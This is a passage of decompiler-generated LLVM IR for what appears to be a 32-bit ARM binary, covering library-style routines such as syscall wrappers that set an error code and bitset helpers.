  %v4_c364 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_c368 = icmp eq i32 %v4_c364, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_c368, label %dec_label_pc_c380, label %dec_label_pc_c354.dec_label_pc_c388_crit_edge

dec_label_pc_c354.dec_label_pc_c388_crit_edge:    ; preds = %dec_label_pc_c354
  br label %dec_label_pc_c388

dec_label_pc_c380:                                ; preds = %dec_label_pc_c354
  store i32 %v3_c358, i32* @r4, align 4
  store i32 %v9_c358, i32* @r6, align 4
  store i32 %v12_c358, i32* @r7, align 4
  store i32 %v15_c358, i32* @r8, align 4
  %v0_c384 = call i32 @function_c310()
  br label %dec_label_pc_c388

dec_label_pc_c388:                                ; preds = %dec_label_pc_c354.dec_label_pc_c388_crit_edge, %dec_label_pc_c380
  %v0_c388 = call i32 @function_e9c8()
  %v0_c38c = load i32, i32* @r6, align 4
  store i32 %v0_c38c, i32* @r1, align 4
  store i32 %v0_c388, i32* @r5, align 4
  %v0_c39c = load i32, i32* @r4, align 4
  store i32 %v0_c39c, i32* @r0, align 4
  %v0_c3a0 = call i32 @function_c310()
  store i32 %v0_c3a0, i32* @r4, align 4
  %v0_c3a8 = load i32, i32* @r5, align 4
  %v1_c3ac = call i32 @function_e940(i32 %v0_c3a8)
  %v0_c3b0 = load i32, i32* @r4, align 4
  %v2_c3b4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_c3b4, i32* @r4, align 4
  store i32 %v6_c358, i32* @r5, align 4
  store i32 %v9_c358, i32* @r6, align 4
  store i32 %v12_c358, i32* @r7, align 4
  store i32 %v15_c358, i32* @r8, align 4
  store i32 %v18_c358, i32* @lr, align 4
  ret i32 %v0_c3b0

; uselistorder directives
  uselistorder label %dec_label_pc_c388, { 1, 0 }
}

define i32 @function_c3c4() local_unnamed_addr {
dec_label_pc_c3c4:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c3c4 = load i32, i32* @r4, align 4
  store i32 %v3_c3c4, i32* %stack_var_-16, align 4
  %v0_c3d8 = load i32, i32* @r0, align 4
  store i32 %v0_c3d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c3d8, -4095
  br i1 %tmp, label %dec_label_pc_c400, label %dec_label_pc_c3e8

dec_label_pc_c3e8:                                ; preds = %dec_label_pc_c3c4
  %v0_c3ec = call i32 @function_f150()
  %v3_c3f0 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c3f0 = sext i16 %v3_c3f0 to i32
  %v0_c3f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c3f4 = sub i32 0, %v0_c3f4
  store i32 %v1_c3f4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = add i32 %v4_c3f0, %v0_c3ec
  %v4_c3f8 = inttoptr i32 %v3_c3f8 to i32*
  store i32 %v1_c3f4, i32* %v4_c3f8, align 4
  %v2_c400.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_c400

dec_label_pc_c400:                                ; preds = %dec_label_pc_c3c4, %dec_label_pc_c3e8
  %v1_c404 = phi i32 [ %v0_c3d8, %dec_label_pc_c3c4 ], [ -1, %dec_label_pc_c3e8 ]
  %v2_c400 = phi i32 [ %v3_c3c4, %dec_label_pc_c3c4 ], [ %v2_c400.pre, %dec_label_pc_c3e8 ]
  store i32 %v2_c400, i32* @r4, align 4
  ret i32 %v1_c404

; uselistorder directives
  uselistorder i32 %v0_c3d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c400, { 1, 0 }
}

define i32 @function_c40c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_c40c:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_c40c = load i32, i32* @r4, align 4
  %v6_c40c = load i32, i32* @r5, align 4
  %v9_c40c = load i32, i32* @r6, align 4
  %v12_c40c = load i32, i32* @r7, align 4
  %v15_c40c = load i32, i32* @r8, align 4
  %v18_c40c = load i32, i32* @sb, align 4
  %v21_c40c = load i32, i32* @sl, align 4
  %v24_c40c = load i32, i32* @lr, align 4
  %v4_c41c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_c424 = icmp eq i32 %v4_c41c, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_c424, label %dec_label_pc_c444, label %dec_label_pc_c450

dec_label_pc_c444:                                ; preds = %dec_label_pc_c40c
  store i32 %v3_c40c, i32* @r4, align 4
  store i32 %v12_c40c, i32* @r7, align 4
  store i32 %v15_c40c, i32* @r8, align 4
  store i32 %v18_c40c, i32* %sb.global-to-local, align 4
  %v0_c44c = call i32 @function_c3c4()
  br label %dec_label_pc_c450

dec_label_pc_c450:                                ; preds = %dec_label_pc_c40c, %dec_label_pc_c444
  %v0_c450 = call i32 @function_e9c8()
  %v0_c454 = load i32, i32* @r7, align 4
  store i32 %v0_c454, i32* @r1, align 4
  store i32 %v0_c450, i32* @r5, align 4
  %v0_c464 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c464, i32* @r0, align 4
  %v0_c46c = call i32 @function_c3c4()
  store i32 %v0_c46c, i32* @r4, align 4
  %v0_c474 = load i32, i32* @r5, align 4
  %v1_c478 = call i32 @function_e940(i32 %v0_c474)
  %v0_c47c = load i32, i32* @r4, align 4
  store i32 %v6_c40c, i32* @r5, align 4
  store i32 %v9_c40c, i32* @r6, align 4
  store i32 %v12_c40c, i32* @r7, align 4
  store i32 %v15_c40c, i32* @r8, align 4
  store i32 %v18_c40c, i32* @sb, align 4
  store i32 %v21_c40c, i32* @sl, align 4
  store i32 %v24_c40c, i32* @lr, align 4
  ret i32 %v0_c47c

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c450, { 1, 0 }
}

define i32 @function_c494() local_unnamed_addr {
dec_label_pc_c494:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c494 = load i32, i32* @r7, align 4
  store i32 %v3_c494, i32* %stack_var_-8, align 4
  %v0_c4a0 = load i32, i32* @r0, align 4
  store i32 %v0_c4a0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c4a0, -4095
  br i1 %tmp, label %dec_label_pc_c4c8, label %dec_label_pc_c4b0

dec_label_pc_c4b0:                                ; preds = %dec_label_pc_c494
  %v0_c4b4 = call i32 @function_f150()
  %v3_c4b8 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c4b8 = sext i16 %v3_c4b8 to i32
  store i32 %v4_c4b8, i32* @r3, align 4
  %v0_c4bc = load i32, i32* %r2.global-to-local, align 4
  %v1_c4bc = sub i32 0, %v0_c4bc
  store i32 %v1_c4bc, i32* %r2.global-to-local, align 4
  %v3_c4c0 = add i32 %v4_c4b8, %v0_c4b4
  %v4_c4c0 = inttoptr i32 %v3_c4c0 to i32*
  store i32 %v1_c4bc, i32* %v4_c4c0, align 4
  %v2_c4c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c4c8

dec_label_pc_c4c8:                                ; preds = %dec_label_pc_c494, %dec_label_pc_c4b0
  %v1_c4cc = phi i32 [ %v0_c4a0, %dec_label_pc_c494 ], [ -1, %dec_label_pc_c4b0 ]
  %v2_c4c8 = phi i32 [ %v3_c494, %dec_label_pc_c494 ], [ %v2_c4c8.pre, %dec_label_pc_c4b0 ]
  store i32 %v2_c4c8, i32* @r7, align 4
  ret i32 %v1_c4cc

; uselistorder directives
  uselistorder i32 %v0_c4a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c4c8, { 1, 0 }
}

define i32 @function_c4d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c4d0:
  %v0_c4d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c4d0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c4d0
  %v2_c4d4 = load i32, i32* @r8, align 4
  %v3_c4d4 = load i32, i32* @lr, align 4
  %v8_c4d4 = shl i32 %v2_c4d4, %v3_c4d4
  %v9_c4d4 = and i32 %v8_c4d4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c4d0, %bb
  %v10_c4d4 = phi i32 [ %arg1, %dec_label_pc_c4d0 ], [ %v9_c4d4, %bb ]
  ret i32 %v10_c4d4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c4d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c4d8:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_c4dc = load i32, i32* @r4, align 4
  store i32 %v3_c4dc, i32* %stack_var_-24, align 4
  %v6_c4dc = load i32, i32* @r5, align 4
  %v9_c4dc = load i32, i32* @r6, align 4
  %v12_c4dc = load i32, i32* @r7, align 4
  %v15_c4dc = load i32, i32* @r8, align 4
  %v18_c4dc = load i32, i32* @lr, align 4
  %v4_c4e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_c4ec = icmp eq i32 %v4_c4e8, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_c4ec, label %dec_label_pc_c504, label %dec_label_pc_c4d8.dec_label_pc_c50c_crit_edge

dec_label_pc_c4d8.dec_label_pc_c50c_crit_edge:    ; preds = %dec_label_pc_c4d8
  br label %dec_label_pc_c50c

dec_label_pc_c504:                                ; preds = %dec_label_pc_c4d8
  store i32 %v3_c4dc, i32* @r4, align 4
  store i32 %v9_c4dc, i32* @r6, align 4
  store i32 %v12_c4dc, i32* @r7, align 4
  store i32 %v15_c4dc, i32* @r8, align 4
  %v0_c508 = call i32 @function_c494()
  br label %dec_label_pc_c50c

dec_label_pc_c50c:                                ; preds = %dec_label_pc_c4d8.dec_label_pc_c50c_crit_edge, %dec_label_pc_c504
  %v0_c50c = call i32 @function_e9c8()
  %v0_c510 = load i32, i32* @r6, align 4
  store i32 %v0_c510, i32* @r1, align 4
  store i32 %v0_c50c, i32* @r5, align 4
  %v0_c51c = load i32, i32* @r8, align 4
  store i32 %v0_c51c, i32* @r3, align 4
  %v0_c520 = load i32, i32* @r4, align 4
  store i32 %v0_c520, i32* @r0, align 4
  %v0_c524 = call i32 @function_c494()
  store i32 %v0_c524, i32* @r4, align 4
  %v0_c52c = load i32, i32* @r5, align 4
  %v1_c530 = call i32 @function_e940(i32 %v0_c52c)
  %v0_c534 = load i32, i32* @r4, align 4
  %v2_c538 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_c538, i32* @r4, align 4
  store i32 %v6_c4dc, i32* @r5, align 4
  store i32 %v9_c4dc, i32* @r6, align 4
  store i32 %v12_c4dc, i32* @r7, align 4
  store i32 %v15_c4dc, i32* @r8, align 4
  store i32 %v18_c4dc, i32* @lr, align 4
  ret i32 %v0_c534

; uselistorder directives
  uselistorder label %dec_label_pc_c50c, { 1, 0 }
}

define i32 @function_c548(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_c548:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_c580, label %dec_label_pc_c568

dec_label_pc_c568:                                ; preds = %dec_label_pc_c548
  %v0_c56c = call i32 @function_f150()
  %v3_c570 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c570 = sext i16 %v3_c570 to i32
  store i32 %v4_c570, i32* @r3, align 4
  %v0_c574 = load i32, i32* %r2.global-to-local, align 4
  %v1_c574 = sub i32 0, %v0_c574
  store i32 %v1_c574, i32* %r2.global-to-local, align 4
  %v3_c578 = add i32 %v4_c570, %v0_c56c
  %v4_c578 = inttoptr i32 %v3_c578 to i32*
  store i32 %v1_c574, i32* %v4_c578, align 4
  br label %dec_label_pc_c580

dec_label_pc_c580:                                ; preds = %dec_label_pc_c548, %dec_label_pc_c568
  %v1_c584 = phi i32 [ %arg1, %dec_label_pc_c548 ], [ -1, %dec_label_pc_c568 ]
  ret i32 %v1_c584

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_c580, { 1, 0 }
}

define i32 @function_c588(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c588:
  %v0_c588 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c588, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c588
  %v2_c588 = load i32, i32* @r6, align 4
  %v5_c588 = udiv i32 %v2_c588, 4
  %v6_c588 = and i32 %v5_c588, %arg1
  %v3_c58c = udiv i32 %v6_c588, 67108864
  %v4_c58c = mul i32 %v6_c588, 64
  %v5_c58c = or i32 %v3_c58c, %v4_c58c
  %v8_c58c = and i32 %v5_c58c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c588, %bb
  %v9_c58c = phi i32 [ %arg1, %dec_label_pc_c588 ], [ %v8_c58c, %bb ]
  ret i32 %v9_c58c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c590(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c590:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c590 = load i32, i32* @r7, align 4
  store i32 %v3_c590, i32* %stack_var_-8, align 4
  %v0_c59c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_c59c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c59c, -4095
  br i1 %tmp, label %dec_label_pc_c5c4, label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c590
  %v0_c5b0 = call i32 @function_f150()
  %v3_c5b4 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c5b4 = sext i16 %v3_c5b4 to i32
  store i32 %v4_c5b4, i32* @r3, align 4
  %v0_c5b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5b8 = sub i32 0, %v0_c5b8
  store i32 %v1_c5b8, i32* %r2.global-to-local, align 4
  %v3_c5bc = add i32 %v4_c5b4, %v0_c5b0
  %v4_c5bc = inttoptr i32 %v3_c5bc to i32*
  store i32 %v1_c5b8, i32* %v4_c5bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_c5c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c5c4

dec_label_pc_c5c4:                                ; preds = %dec_label_pc_c590, %dec_label_pc_c5ac
  %v1_c5c8 = phi i32 [ %v0_c59c, %dec_label_pc_c590 ], [ -1, %dec_label_pc_c5ac ]
  %v2_c5c4 = phi i32 [ %v3_c590, %dec_label_pc_c590 ], [ %v2_c5c4.pre, %dec_label_pc_c5ac ]
  store i32 %v2_c5c4, i32* @r7, align 4
  ret i32 %v1_c5c8

; uselistorder directives
  uselistorder i32 %v0_c59c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c5c4, { 1, 0 }
}

define i32 @function_c5cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c5cc:
  %v0_c5cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c5cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c5cc
  %v2_c5d0 = load i32, i32* @ip, align 4
  %v3_c5d0 = load i32, i32* @sp, align 4
  %v8_c5d0 = shl i32 %v2_c5d0, %v3_c5d0
  %v9_c5d0 = and i32 %v8_c5d0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c5cc, %bb
  %v10_c5d0 = phi i32 [ %arg1, %dec_label_pc_c5cc ], [ %v9_c5d0, %bb ]
  ret i32 %v10_c5d0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c5d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c5d4:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c5d4 = load i32, i32* @r4, align 4
  store i32 %v3_c5d4, i32* %stack_var_-16, align 4
  %v6_c5d4 = load i32, i32* @r5, align 4
  %v9_c5d4 = load i32, i32* @r6, align 4
  %v7_c5dc = icmp eq i32 %arg2, -1
  br i1 %v7_c5dc, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_c5d4
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_c5d4
  %v2_c5e4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_c600

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_c608

dec_label_pc_c600:                                ; preds = %bb
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r6, align 4
  %v7_c604 = icmp slt i32 %arg1, 65
  br i1 %v7_c604, label %dec_label_pc_c624, label %dec_label_pc_c608

dec_label_pc_c608:                                ; preds = %.thread16, %dec_label_pc_c600
  %v0_c60c = call i32 @function_f150()
  %v3_c610 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c610 = sext i16 %v3_c610 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_c61c = add i32 %v4_c610, %v0_c60c
  %v4_c61c = inttoptr i32 %v3_c61c to i32*
  store i32 22, i32* %v4_c61c, align 4
  %v0_c67c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_c624:                                ; preds = %dec_label_pc_c600
  %v2_c624 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_c624, i32* @r4, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_c62c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v2_c63c = call i32 @function_c6bc(i32 %v2_c62c, i32 %arg1)
  %v0_c644 = load i32, i32* @r5, align 4
  store i32 %v0_c644, i32* %r1.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = add i32 %v0_c648, 11564
  %v2_c64c = call i32 @function_c698(i32 %v2_c648, i32 %v0_c644)
  store i32 %v2_c624, i32* %r1.global-to-local, align 4
  %v0_c660 = load i32, i32* @r5, align 4
  %v3_c66c = call i32 @function_f0a4(i32 %v0_c660, i32 %v2_c624, i32 %v2_c5e4)
  %v1_c670 = icmp slt i32 %v3_c66c, 0
  br i1 %v1_c670, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_c624
  %v5_c674 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_c674, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_c624
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_c608, %bb32
  %v0_c67c = phi i32 [ %v5_c674, %bb31 ], [ %v0_c67c.pre, %dec_label_pc_c608 ], [ -1, %bb32 ]
  %v2_c684 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c684, i32* @r4, align 4
  store i32 %v6_c5d4, i32* @r5, align 4
  store i32 %v9_c5d4, i32* @r6, align 4
  ret i32 %v0_c67c

; uselistorder directives
  uselistorder i32 %v2_c624, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c608, { 1, 0 }
}

define i32 @function_c698(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c698:
  %v1_c698 = add i32 %arg2, -1
  %v3_c69c = udiv i32 %v1_c698, 32
  %v4_c6a0 = mul nuw nsw i32 %v3_c69c, 4
  %v5_c6a0 = add i32 %v4_c6a0, %arg1
  %v6_c6a0 = inttoptr i32 %v5_c6a0 to i32*
  %v7_c6a0 = load i32, i32* %v6_c6a0, align 4
  %v1_c6a4 = urem i32 %v1_c698, 32
  %v7_c6ac = shl i32 1, %v1_c6a4
  %v8_c6ac = and i32 %v7_c6a0, %v7_c6ac
  %v10_c6ac = icmp ne i32 %v8_c6ac, 0
  %. = zext i1 %v10_c6ac to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_c698, { 1, 0 }
}

define i32 @function_c6bc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c6bc:
  %v1_c6bc = add i32 %arg2, -1
  %v3_c6c0 = udiv i32 %v1_c6bc, 32
  %v4_c6c4 = mul nuw nsw i32 %v3_c6c0, 4
  %v5_c6c4 = add i32 %v4_c6c4, %arg1
  %v6_c6c4 = inttoptr i32 %v5_c6c4 to i32*
  %v7_c6c4 = load i32, i32* %v6_c6c4, align 4
  %v1_c6c8 = urem i32 %v1_c6bc, 32
  %v7_c6d0 = shl i32 1, %v1_c6c8
  %v8_c6d0 = or i32 %v7_c6c4, %v7_c6d0
  store i32 %v8_c6d0, i32* %v6_c6c4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_c6bc, { 1, 0 }
}

define i32 @function_c6e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c6e0:
  %v1_c6e0 = add i32 %arg2, -1
  %v3_c6e4 = udiv i32 %v1_c6e0, 32
  %v4_c6e8 = mul nuw nsw i32 %v3_c6e4, 4
  %v5_c6e8 = add i32 %v4_c6e8, %arg1
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  %v1_c6ec = urem i32 %v1_c6e0, 32
  %tmp = shl i32 -1, %v1_c6ec
  %v8_c6f4 = add i32 %tmp, -1
  %v9_c6f4 = and i32 %v7_c6e8, %v8_c6f4
  store i32 %v9_c6f4, i32* %v6_c6e8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_c6e0, { 1, 0 }
}

define i32 @function_c704(i32 %arg1) local_unnamed_addr {
dec_label_pc_c704:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_c704 = udiv i32 %arg1, 256
  store i32 %v3_c704, i32* %r1.global-to-local, align 4
  %v2_c708 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_c708, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_c704
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_c704, %bb
  %v0_c714 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_c708, i32 %v0_c714)
  %v0_c718 = load i32, i32* %r1.global-to-local, align 4
  %v1_c718 = add i32 %v0_c718, 1048320
  %v3_c71c = udiv i32 %v1_c718, 65536
  %v1_c720 = and i32 %v3_c71c, 8
  %v6_c724 = shl i32 %v0_c718, %v1_c720
  %v1_c728 = add i32 %v6_c724, 520192
  %v3_c72c = udiv i32 %v1_c728, 65536
  %v1_c730 = and i32 %v3_c72c, 4
  %v6_c734 = shl i32 %v6_c724, %v1_c730
  %v1_c738 = add i32 %v6_c734, 245760
  %v3_c73c = udiv i32 %v1_c738, 65536
  %v1_c740 = and i32 %v3_c73c, 2
  %v6_c744 = shl i32 %v6_c734, %v1_c740
  store i32 %v6_c744, i32* %r1.global-to-local, align 4
  %v1_c748 = sub nsw i32 13, %v1_c720
  %v2_c74c = sub nsw i32 %v1_c748, %v1_c730
  %v3_c750 = udiv i32 %v6_c744, 32768
  %v4_c750 = sub nuw nsw i32 -1, %v3_c750
  %v4_c754 = udiv i32 %v6_c744, 16384
  %v5_c754 = and i32 %v4_c754, %v4_c750
  %v2_c758 = sub nsw i32 %v2_c74c, %v1_c740
  %v2_c75c = add nsw i32 %v2_c758, %v5_c754
  %v1_c760 = add nsw i32 %v2_c75c, 6
  %v0_c764 = load i32, i32* %ip.global-to-local, align 4
  %v6_c764 = lshr i32 %v0_c764, %v1_c760
  %v3_c768 = mul nsw i32 %v2_c75c, 4
  %v1_c76c = add nsw i32 %v3_c768, 32
  %v1_c770 = urem i32 %v6_c764, 4
  %v2_c774 = or i32 %v1_c770, %v1_c76c
  ret i32 %v2_c774

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_c77c(i32 %arg1) local_unnamed_addr {
dec_label_pc_c77c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_c77c = load i32, i32* @r4, align 4
  %v6_c77c = load i32, i32* @r5, align 4
  %v9_c77c = load i32, i32* @r6, align 4
  %v12_c77c = load i32, i32* @r7, align 4
  %v15_c77c = load i32, i32* @r8, align 4
  %v18_c77c = load i32, i32* @sb, align 4
  %v21_c77c = load i32, i32* @sl, align 4
  %v24_c77c = load i32, i32* @fp, align 4
  %v27_c77c = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r1.global-to-local, align 4
  %v4_c790 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 108) to i32*), align 4
  store i32 %v4_c790, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_c79c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 68) to i32*), align 4
  store i32 %v4_c79c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_c790, i32* %r2.global-to-local, align 4
  %v2_c7a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_c7a8, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  %v4_c7b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), align 4
  store i32 %v4_c7b4, i32* %ip.global-to-local, align 4
  store i32 51136, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_c7b4)
  %v0_c7c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c7c0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r1, align 4
  %v4_c7cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 16) to i32*), align 4
  store i32 %v4_c7cc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_c7d8.292 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_c7cc)
  %v0_c7d8 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_c7d8, -32
  br i1 %tmp, label %dec_label_pc_c7fc, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c77c
  store i32 68328, i32* %r2.global-to-local, align 4
  %v0_c7e4 = call i32 @function_f150()
  store i32 %v0_c7e4, i32* %r0.global-to-local, align 4
  %v3_c7e8 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c7e8 = sext i16 %v3_c7e8 to i32
  store i32 %v4_c7e8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_c7f4 = add i32 %v4_c7e8, %v0_c7e4
  %v4_c7f4 = inttoptr i32 %v3_c7f4 to i32*
  store i32 12, i32* %v4_c7f4, align 4
  br label %dec_label_pc_d080

dec_label_pc_c7fc:                                ; preds = %dec_label_pc_c77c
  %v1_c7fc = add i32 %v0_c7d8, 11
  store i32 %v1_c7fc, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v2_c808 = icmp ugt i32 %v1_c7fc, 14
